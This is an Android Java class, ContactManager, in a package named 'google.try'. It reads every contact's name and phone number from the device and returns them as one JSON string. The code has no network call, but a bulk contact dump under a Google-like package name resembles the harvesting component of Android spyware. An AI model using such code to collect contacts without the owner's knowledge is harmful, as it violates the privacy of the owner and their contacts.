package google.try;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;

public class ContactManager {

    public static String getContacts(Context context) {
        JSONArray contactList = new JSONArray();
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            while (!cursor.isAfterLast()) {
                try {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    contact.put("number", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    contactList.put(contact);
                } catch (Exception e) { }
                cursor.moveToNext();
            }
            cursor.close();
        }
        return contactList.toString();
    }
}
